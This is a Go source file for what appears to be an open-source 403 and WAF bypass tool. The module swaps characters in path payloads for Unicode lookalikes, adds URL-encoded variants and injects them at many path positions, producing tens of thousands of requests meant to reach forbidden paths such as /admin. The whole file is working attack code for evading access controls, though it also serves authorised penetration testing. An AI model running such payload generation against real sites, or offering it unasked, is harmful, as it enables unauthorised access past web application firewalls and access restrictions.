/*
Package payload provides the unicode_path_experimental bypass module.

This module exploits Unicode normalization and character confusability vulnerabilities
in WAFs by substituting ASCII characters with visually similar Unicode lookalikes.
Many WAFs fail to properly normalize or decode Unicode characters, allowing bypasses
when the backend application normalizes them back to ASCII.

Attack Vector:

	WAF sees:     /admin․․%E2%80%A4/test  (Unicode one-dot leader U+2024)
	Backend sees: /admin.../test           (normalized to ASCII dots)

Key Features:
  - Systematic one-character-at-a-time substitution (maximizes test coverage)
  - Byte-based UTF-8 processing (efficient and correct)
  - Preserves percent-encoded sequences (doesn't break existing encoding)
  - Doubles payloads with URL-encoded variants (tests both raw and encoded)
  - Integrates with mid_paths logic (comprehensive path manipulation)

Module Integration:
  - Complements standard mid_paths module (no payload duplication)
  - Uses unicode_normalization_map.json for lookalike mappings
  - Controlled by maxNormalizationsExperimental constant
  - Can run alongside other modules in parallel

Performance:
  - Generates ~75K payloads with maxNormalizationsExperimental=2
  - Generates ~150K+ payloads with maxNormalizationsExperimental=5
  - Adjust based on testing requirements and target response time
*/
package payload

import (
	"strings"
	"unicode/utf8"

	"github.com/slicingmelon/go-rawurlparser"
	GB403Logger "github.com/slicingmelon/gobypass403/core/utils/logger"
)

const (
	// maxNormalizationsExperimental limits the number of Unicode lookalike variants
	// generated per character position to control payload explosion
	maxNormalizationsExperimental = 2
)

// substituteAtPosition replaces the character at a specific position with a Unicode lookalike.
//
// Parameters:
//   - payload: The input string to process (e.g., "..;")
//   - charMap: Lookup map of rune → []string (available Unicode lookalikes)
//   - targetPos: The substitutable position to modify (0-indexed, excludes percent-encoded sequences)
//   - mappingIndex: Which lookalike variant to use (0 = first lookalike, 1 = second, etc.)
//
// Returns:
//   - Modified payload string
//   - Boolean indicating whether substitution occurred
//
// Implementation Notes:
//   - Uses byte-based UTF-8 processing for efficiency
//   - Preserves percent-encoded sequences (%XX) without modification
//   - Uses utf8.DecodeRune/EncodeRune for proper Unicode handling
//   - Position counter ignores percent-encoded sequences
func substituteAtPosition(payload string, charMap map[rune][]string, targetPos int, mappingIndex int) (string, bool) {
	input := []byte(payload)
	var builder strings.Builder
	builder.Grow(len(input) * 3) // Pre-allocate for potential UTF-8 expansion

	modified := false
	currentPos := 0 // Tracks substitutable position (ignores percent-encoded sequences)

	for i := 0; i < len(input); {
		// Check for percent-encoding (byte-based, more efficient)
		if input[i] == '%' && i+2 < len(input) &&
			isHexDigitASCII(input[i+1]) && isHexDigitASCII(input[i+2]) {
			// Keep percent-encoded sequences as-is (don't count as substitutable position)
			builder.Write(input[i : i+3])
			i += 3
			continue
		}

		// Decode UTF-8 rune properly
		r, size := utf8.DecodeRune(input[i:])

		// Check if this is the target position for substitution
		if currentPos == targetPos {
			if lookalikes, ok := charMap[r]; ok && mappingIndex < len(lookalikes) {
				builder.WriteString(lookalikes[mappingIndex])
				modified = true
				i += size
				currentPos++
				continue
			}
		}

		// No substitution - encode the rune back using utf8.EncodeRune
		var buf [4]byte
		n := utf8.EncodeRune(buf[:], r)
		builder.Write(buf[:n])

		i += size
		currentPos++
	}

	return builder.String(), modified
}

/*
GenerateUnicodePathExperimentalPayloads generates WAF bypass payloads by systematically substituting
ASCII characters in the internal_midpaths.lst with their Unicode lookalike characters (confusables).

Algorithm:
 1. Load unicode_normalization_map.json containing ASCII→Unicode lookalike mappings
 2. Read base payloads from internal_midpaths.lst (~520 payloads)
 3. For each base payload:
    a. Identify substitutable character positions (excludes percent-encoded sequences like %2F)
    b. Generate up to maxNormalizationsExperimental variants per position
    c. Each variant substitutes ONE character at ONE position with a Unicode lookalike
 4. Deduplicate all generated Unicode variants
 5. Double the variants: create both raw Unicode AND fully URL-encoded versions
 6. Apply mid_paths generation logic to each variant (path manipulation techniques)

Substitution Strategy:
  - Uses byte-based UTF-8 processing (utf8.DecodeRune/EncodeRune)
  - Preserves percent-encoded sequences (%XX) without substitution
  - Generates multiple variants per character position (controlled by maxNormalizationsExperimental)
  - Only ONE character is substituted per variant to maximize test coverage

Example Flow for base payload "..;":

	Step 1: Generate Unicode substitution variants
	  Position 0: "․.;" (first dot → U+2024), "﹒.;" (first dot → U+FE52)
	  Position 1: ".․;" (second dot → U+2024), ".﹒;" (second dot → U+FE52)
	  Position 2: "..;" (semicolon → U+037E), "..︔" (semicolon → U+FE54)
	  Result: ~6 unique Unicode variants

	Step 2: Double with URL-encoded versions
	  Raw:     "․.;"
	  Encoded: "%E2%80%A4.%3B"
	  Result: ~12 variants (6 raw + 6 encoded)

	Step 3: Apply mid_paths generation logic to each variant
	  For each variant, generate all mid_paths positions:
	    - Before path: /․.;/admin/test
	    - Fused with segments: /admin․.;/test
	    - Between segments: /admin/․.;/test
	    - etc.
	  Result: Each variant generates multiple path manipulation attempts

Performance Notes:
  - With maxNormalizationsExperimental = 5: ~150K+ final payloads
  - With maxNormalizationsExperimental = 2: ~75K final payloads
  - Adjust maxNormalizationsExperimental based on target testing requirements

Integration:
  - Works alongside standard mid_paths module (no duplication due to global deduplication)
  - Only generates payloads where Unicode substitution actually occurred
  - Both modules can run in parallel for comprehensive testing
*/
func (pg *PayloadGenerator) GenerateUnicodePathExperimentalPayloads(targetURL string, bypassModule string) []BypassPayload {
	// 1. Load the Unicode character map for substitutions
	unicodeMap, err := ReadUnicodeCharMap()
	if err != nil {
		GB403Logger.Error().Msgf("Failed to read unicode_char_map.json for experimental module: %v", err)
		return []BypassPayload{}
	}

	// 2. Build lookup map: rune -> []string (all available lookalikes, excluding the ASCII itself)
	charToLookalikes := make(map[rune][]string)
	for _, entry := range unicodeMap {
		if len(entry.Char) > 0 && len(entry.Mappings) >= 2 {
			charRunes := []rune(entry.Char)
			if len(charRunes) > 0 {
				// Store all mappings EXCEPT the first one (which is the ASCII character itself)
				lookalikes := make([]string, 0, len(entry.Mappings)-1)
				for i := 1; i < len(entry.Mappings); i++ {
					lookalikes = append(lookalikes, entry.Mappings[i].Unicode)
				}
				if len(lookalikes) > 0 {
					charToLookalikes[charRunes[0]] = lookalikes
				}
			}
		}
	}

	// 3. Read the raw midpath payloads from the file
	rawPayloads, err := ReadPayloadsFromFile("internal_midpaths.lst")
	if err != nil {
		GB403Logger.Error().Msgf("Failed to read midpaths payloads for experimental module: %v", err)
		return []BypassPayload{}
	}

	// 4. Generate Unicode variants by systematic substitution
	unicodePayloadsSet := make(map[string]struct{}) // Use map for deduplication
	totalVariantsGenerated := 0

	for _, payload := range rawPayloads {
		// Count substitutable positions (excluding percent-encoded sequences)
		substitutablePositions := countSubstitutablePositions(payload, charToLookalikes)

		if substitutablePositions == 0 {
			continue // Skip payloads with no substitutable characters
		}

		// Generate variants by substituting ONE position at a time
		for pos := 0; pos < substitutablePositions; pos++ {
			// Generate up to maxNormalizationsExperimental variants for this position
			variantsAtPosition := 0
			for mappingIdx := 0; mappingIdx < maxNormalizationsExperimental; mappingIdx++ {
				variant, modified := substituteAtPosition(payload, charToLookalikes, pos, mappingIdx)

				if modified && variant != payload {
					// Only add if it's different from original and actually modified
					if _, exists := unicodePayloadsSet[variant]; !exists {
						unicodePayloadsSet[variant] = struct{}{}
						totalVariantsGenerated++
						variantsAtPosition++
					}
				} else {
					// No more valid mappings for this position
					break
				}
			}
		}
	}

	// Convert set to slice
	unicodePayloads := make([]string, 0, len(unicodePayloadsSet))
	for payload := range unicodePayloadsSet {
		unicodePayloads = append(unicodePayloads, payload)
	}

	// If no payloads were generated, return empty
	if len(unicodePayloads) == 0 {
		GB403Logger.Debug().BypassModule(bypassModule).Msgf(
			"No Unicode variants generated (checked %d payloads, 0 modified)",
			len(rawPayloads),
		)
		return []BypassPayload{}
	}

	GB403Logger.Debug().BypassModule(bypassModule).Msgf(
		"Generated %d unique Unicode variants from %d base payloads (before URL encoding)",
		len(unicodePayloads), len(rawPayloads),
	)

	// 5. Double the payloads: add URL-encoded versions of each Unicode variant
	finalPayloads := make([]string, 0, len(unicodePayloads)*2)
	for _, payload := range unicodePayloads {
		// Add raw Unicode version
		finalPayloads = append(finalPayloads, payload)

		// Add fully URL-encoded version (encodes all UTF-8 bytes)
		encodedPayload := URLEncodeAll(payload)
		if encodedPayload != payload {
			finalPayloads = append(finalPayloads, encodedPayload)
		}
	}

	GB403Logger.Debug().BypassModule(bypassModule).Msgf(
		"Total variants (with URL-encoded): %d payloads",
		len(finalPayloads),
	)

	// 6. Use the existing mid_paths generation logic with both raw and encoded variants
	return pg.generateMidPathsWithCustomPayloads(targetURL, bypassModule, finalPayloads)
}

// countSubstitutablePositions counts how many character positions can be substituted
// with Unicode lookalikes in the given payload.
//
// Parameters:
//   - payload: The input string to analyze (e.g., "..;%2F")
//   - charMap: Lookup map of rune → []string (to check if character has lookalikes)
//
// Returns:
//   - Number of substitutable positions (percent-encoded sequences are excluded)
//
// Example:
//   - Input: "..;%2F" → Output: 3 (two dots + semicolon; %2F is skipped)
//   - Input: "admin" → Output: 5 (if all chars have lookalikes in map)
func countSubstitutablePositions(payload string, charMap map[rune][]string) int {
	input := []byte(payload)
	count := 0

	for i := 0; i < len(input); {
		// Skip percent-encoded sequences
		if input[i] == '%' && i+2 < len(input) &&
			isHexDigitASCII(input[i+1]) && isHexDigitASCII(input[i+2]) {
			i += 3
			continue
		}

		// Decode rune and check if it's substitutable
		r, size := utf8.DecodeRune(input[i:])
		if _, ok := charMap[r]; ok {
			count++
		}

		i += size
	}

	return count
}

// generateMidPathsWithCustomPayloads applies mid_paths generation logic to a custom payload list.
//
// This is a modified version of GenerateMidPathsPayloads that accepts a pre-generated list
// of payloads instead of reading from internal_midpaths.lst. It applies the same path
// manipulation techniques (before path, fused with segments, between segments, etc.) to
// each payload in the list.
//
// Parameters:
//   - targetURL: The target URL to test (e.g., "https://example.com/admin/test")
//   - bypassModule: The bypass module name for logging/tracking
//   - payloads: Custom list of payloads to use (e.g., Unicode variants)
//
// Returns:
//   - Slice of BypassPayload ready for testing
//
// Usage:
//   - Called by unicode_path_experimental with Unicode-substituted variants
//   - Generates all possible path injection positions for each variant
//   - Handles query strings, special characters, and path segment manipulation
func (pg *PayloadGenerator) generateMidPathsWithCustomPayloads(targetURL string, bypassModule string, payloads []string) []BypassPayload {
	var jobs []BypassPayload
	parsedURL, err := rawurlparser.RawURLParse(targetURL)
	if err != nil {
		GB403Logger.Error().Msgf("Failed to parse URL: %s", targetURL)
		return jobs
	}

	// Get the path, ensuring it starts with a slash for processing
	path := parsedURL.Path
	if path == "" {
		path = "/"
	}

	// Handle query string
	query := ""
	if parsedURL.Query != "" {
		query = "?" + parsedURL.Query
	}

	// Map to store unique paths (for deduplication)
	uniquePaths := make(map[string]struct{})

	// Helper function to add paths with proper handling of special characters
	addPathWithVariants := func(path string) {
		// Add path as-is
		uniquePaths[path+query] = struct{}{}

		// Add path with encoded special characters if needed
		if strings.ContainsAny(path, "?#") {
			encodedPath := encodeQueryAndFragmentChars(path)
			uniquePaths[encodedPath+query] = struct{}{}
		}
	}

	// Split path into segments for insertion
	hasLeadingSlash := strings.HasPrefix(path, "/")
	pathWithoutLeadingSlash := strings.TrimPrefix(path, "/")
	segments := strings.Split(pathWithoutLeadingSlash, "/")

	// 1. Variants before the entire path
	for _, payload := range payloads {
		// Before path without leading slash: PAYLOAD/a/b
		addPathWithVariants(payload + path)

		// Before path with leading slash: /PAYLOAD/a/b
		addPathWithVariants("/" + payload + path)

		// Special case - preserve double slashes if payload ends with slash: /PAYLOAD//a/b
		if strings.HasSuffix(payload, "/") && hasLeadingSlash {
			addPathWithVariants("/" + payload + path) // This keeps the double slash
		}
	}

	// Skip segment manipulations if path is just "/"
	if path != "/" {
		// 2. Process each segment
		for i, segment := range segments {
			if segment == "" {
				continue // Skip empty segments
			}

			for _, payload := range payloads {
				// Create path prefix up to current segment
				prefix := ""
				if hasLeadingSlash {
					prefix = "/"
				}
				for j := 0; j < i; j++ {
					if segments[j] != "" {
						prefix += segments[j] + "/"
					}
				}

				// Create path suffix after current segment
				suffix := ""
				for j := i + 1; j < len(segments); j++ {
					if segments[j] != "" {
						suffix += "/" + segments[j]
					}
				}

				// Variants at segment:

				// Payload fused with segment start: /PAYLOADsegment/
				segStartFused := prefix + payload + segment + suffix
				addPathWithVariants(segStartFused)
				addPathWithVariants("/" + strings.TrimPrefix(segStartFused, "/"))

				// Payload fused with segment end: /segmentPAYLOAD/
				segEndFused := prefix + segment + payload + suffix
				addPathWithVariants(segEndFused)
				addPathWithVariants("/" + strings.TrimPrefix(segEndFused, "/"))

				// Payload after slash before segment: /segment/PAYLOAD/next
				if i < len(segments)-1 || suffix == "" {
					afterSlash := prefix + segment + "/" + payload + suffix
					addPathWithVariants(afterSlash)
					addPathWithVariants("/" + strings.TrimPrefix(afterSlash, "/"))
				}
			}
		}
	}

	// Convert unique paths to BypassPayload jobs
	for rawURI := range uniquePaths {
		// Skip if it's just the query
		if rawURI == query && query != "" {
			continue
		}

		// DO NOT normalize double slashes - they're important for bypass techniques

		job := BypassPayload{
			OriginalURL:  targetURL,
			Method:       "GET",
			Scheme:       parsedURL.Scheme,
			Host:         parsedURL.Host,
			RawURI:       rawURI,
			BypassModule: bypassModule,
		}
		job.PayloadToken = GeneratePayloadToken(job)
		jobs = append(jobs, job)
	}

	GB403Logger.Debug().BypassModule(bypassModule).Msgf("Generated %d payloads for %s", len(jobs), targetURL)
	return jobs
}
